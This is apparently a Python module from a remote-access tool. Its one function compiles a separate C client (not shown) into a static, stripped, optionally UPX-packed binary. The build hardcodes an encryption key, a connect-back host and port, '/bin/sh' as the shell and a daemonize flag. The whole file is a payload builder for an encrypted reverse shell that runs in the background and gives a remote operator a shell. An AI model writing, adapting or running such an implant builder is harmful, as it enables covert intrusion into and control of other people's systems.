import asyncio
import logging
from asyncio.subprocess import create_subprocess_exec
from pathlib import Path
from tempfile import TemporaryDirectory

import anyio

CLIENT_SOURCE = Path(__file__).parent / "client.c"


logger = logging.getLogger(__name__)


async def compile_client(
    encryption_key: str,
    host: tuple[str, int],
    compiler: str = "gcc",
    shell_command: str = "/bin/sh",
    buffer_length: int = 1024,
    upx: bool = False,
    compiler_extra_args: tuple[str, ...] = ("-flto", "-Oz", "-s", "-static"),
):
    if not encryption_key.isascii():
        raise ValueError("Encryption key must be ASCII")

    hostname, port = host
    defines = {
        "ENCRYPTION_KEY": repr(encryption_key),
        "CONNECT_HOST": repr(hostname),
        "CONNECT_PORT": port,
        "SHELL_COMMAND": repr(shell_command),
        "BUFFER_LENGTH": buffer_length,
        "DAEMONIZE": 1,
    }

    with TemporaryDirectory() as temp_dir:
        client_binary = Path(temp_dir) / "client"

        result = await create_subprocess_exec(
            compiler,
            *["-o", client_binary, *compiler_extra_args],
            *[f"-D{key}={value}" for key, value in defines.items()],
            CLIENT_SOURCE,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        _, stderr = await result.communicate()
        if result.returncode:
            logger.error("Failed to compile client: %s", stderr.decode())
            raise RuntimeError("Failed to compile client")

        file_size = client_binary.stat().st_size
        logger.info("Client compiled: %s (%d bytes)", client_binary, file_size)

        if upx:
            result = await create_subprocess_exec(
                "upx",
                "--best",
                client_binary,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            _, stderr = await result.communicate()

            if result.returncode:
                logger.error("Failed to compress client: %s", stderr.decode())
                raise RuntimeError("Failed to compress client")

            compressed_size = client_binary.stat().st_size
            logger.info(
                "Client compressed: %s (%d bytes, %.2f%%)",
                client_binary,
                compressed_size,
                (compressed_size / file_size) * 100,
            )

        async with await anyio.open_file(client_binary, "rb") as f:
            result = await f.read()

    return result
